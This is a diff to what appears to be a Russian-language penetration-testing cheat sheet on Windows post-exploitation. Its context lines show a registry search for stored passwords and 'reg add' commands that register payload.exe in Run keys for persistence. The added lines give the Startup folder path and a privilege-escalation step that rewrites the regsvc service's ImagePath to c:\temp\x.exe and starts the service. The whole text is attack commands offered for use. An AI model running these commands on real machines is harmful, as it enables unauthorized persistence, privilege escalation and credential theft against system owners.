@@ -115,6 +115,9 @@ reg query HKLM /f password /t REG_SZ /s - поиск слова password в ре
 
 
 Автозагрузка.....
+
+"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+
 Если у вас права обычного пользователя, следует использовать ветку реестра HKCU
 
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
@@ -137,6 +140,11 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\
  
 reg add “HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run” /v payload /t REG_SZ /d “C:\tmp\payload.exe”
 
+********************************
+
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
+
+ In the command prompt type: sc start regsvc
 
 # Пример создания запланированной задачи:
 
